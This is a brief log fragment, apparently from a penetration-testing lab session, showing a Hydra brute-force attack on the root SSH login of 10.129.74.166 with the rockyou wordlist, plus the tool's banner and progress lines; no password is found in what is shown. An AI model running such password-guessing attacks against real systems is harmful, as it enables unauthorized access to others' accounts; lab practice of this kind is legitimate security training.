@@ -1,0 +1,13 @@
+### [2026-04-22 20:01:13] hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.129.74.166 -t 4
+
+$ hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.129.74.166 -t 4
+
+Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-22 20:01:14
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
+[DATA] attacking ssh://10.129.74.166:22/
+[STATUS] 64.00 tries/min, 64 tries in 00:01h, 14344335 to do in 3735:31h, 4 active
+[STATUS] 58.67 tries/min, 176 tries in 00:03h, 14344223 to do in 4075:04h, 4 active
+[STATUS] 56.14 tries/min, 393 tries in 00:07h, 14344006 to do in 4258:12h, 4 active
+[STATUS] 56.33 tries/min, 845 tries in 00:15h, 14343554 to do in 4243:40h, 4 active
